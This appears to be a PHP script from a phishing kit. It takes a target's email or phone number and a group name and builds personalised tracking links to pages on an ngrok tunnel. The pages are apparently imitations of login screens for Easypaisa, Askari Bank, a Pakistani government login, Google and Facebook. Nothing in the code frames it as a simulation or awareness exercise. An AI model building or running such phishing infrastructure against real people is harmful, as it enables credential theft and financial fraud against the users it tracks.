<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['contact'])) {
    $_SESSION['contact'] = $_POST['contact']; // Store email/phone in session

    $contact = urlencode($_SESSION['contact']); // Encode to use in URLs
    $groupName = isset($_SESSION['group_name']) ? $_SESSION['group_name'] : 'Unknown Group';

    // Define base URLs
    $baseUrls = [
        "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
        "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
        "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
        "https://8671-103-137-24-144.ngrok-free.app/google/googlei.php",
        "https://8671-103-137-24-144.ngrok-free.app/real-Estate-Management-System-main/",
        "https://8671-103-137-24-144.ngrok-free.app/facebook/facebook_login.php",
        "https://8671-103-137-24-144.ngrok-free.app/warZoneCommand/index.php",
        "https://8671-103-137-24-144.ngrok-free.app/hackathon/index.html#about",
        "https://8671-103-137-24-144.ngrok-free.app/eshop2",
        "https://8671-103-137-24-144.ngrok-free.app/stylo_website/welcome_stylo.php"
    ];

    // Generate links with contact parameter
    $generatedLinks = [];
    foreach ($baseUrls as $url) {
        $generatedLinks[] = $url . "?group=" . urlencode($groupName) . "&contact=" . $contact;
    }

    $_SESSION['generated_links'] = $generatedLinks;

    // Redirect back to the main page to display generated links
    header("Location: index.php");
    exit();
}
?>
